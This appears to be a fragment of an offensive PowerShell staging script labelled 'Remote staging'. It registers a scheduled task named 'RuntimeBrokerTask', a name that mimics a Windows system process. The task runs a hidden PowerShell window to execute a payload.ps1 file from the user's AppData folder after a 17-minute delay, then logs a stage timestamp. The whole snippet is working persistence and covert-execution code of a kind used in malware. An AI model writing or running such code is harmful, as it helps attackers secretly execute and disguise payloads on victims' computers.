# Remote staging
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "powershell.exe -NoP -WindowStyle Hidden -File `"$env:APPDATA\payload.ps1`""
$TaskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(17)
Register-ScheduledTask -TaskName 'RuntimeBrokerTask' -Action $TaskAction -Trigger $TaskTrigger -Force
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
$StageMarker = "stage-44"
